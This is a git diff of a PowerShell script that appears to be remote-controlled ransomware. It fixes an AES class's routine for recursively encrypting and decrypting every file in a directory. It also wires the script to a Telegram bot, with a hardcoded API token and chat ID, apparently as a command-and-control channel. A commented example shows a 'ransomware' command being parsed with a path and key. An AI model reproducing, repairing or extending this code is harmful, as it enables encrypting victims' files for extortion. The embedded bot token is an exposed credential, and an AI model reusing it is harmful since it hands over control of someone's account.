@@ -221,13 +221,18 @@ class AEScrypto
         [System.IO.File]::WriteAllBytes($path,$dec)
         return $true
     }
+
+    [array]GetFiles($path) 
+    { 
+        return (Get-ChildItem -Path $path -Recurse -Force | where name -ne $null | Select FullName).FullName
+    }
+
     [array]EncyptDirectory($path,$key,$iv)
     {
         $sec=@()
         $fal=@()
-        foreach ($i in (GetFiles($path))){
+        foreach ($i in (([AEScrypto]::new()).GetFiles($path))){
             try{
-                $i = [string](($i).FullName)
                 if(([System.IO.File]::Exists($i))-eq $true)
                 {
                     ([AEScrypto]::new()).encryptFile($i,$key,$iv)
@@ -239,13 +244,13 @@ class AEScrypto
         }
         return $sec + $fal
     }
+
     [array]DecryptDirectory($path,$key,$iv)
     {
         $sec=@()
         $fal=@()
-        foreach ($i in (GetFiles($path))){
+        foreach ($i in (([AEScrypto]::new()).GetFiles($path))){
             try{
-                $i = [string](($i).FullName)
                 if(([System.IO.File]::Exists($i))-eq $true)
                 {
                     ([AEScrypto]::new()).decryptFile($i,$key,$iv)
@@ -1008,10 +1013,7 @@ function savePassword-clearText
     }
 }
 
-function GetFiles($path) 
-{ 
-    return Get-ChildItem -Path $path -Recurse -Force | where name -ne $null | Select-Object FullName
-}
+
 
 $apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
 $chat_id = '-1001830797904'
@@ -1021,4 +1023,5 @@ handle-client -apiToken  $apiToken -chat_id $chat_id -update "NotNull"
 # $command = 'ransomware -AC -p C:\Users\aronc\zxc.txt -k asdf'
 # $key = (($command -split '-k ')[-1]).Trim()
 # $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
+
 
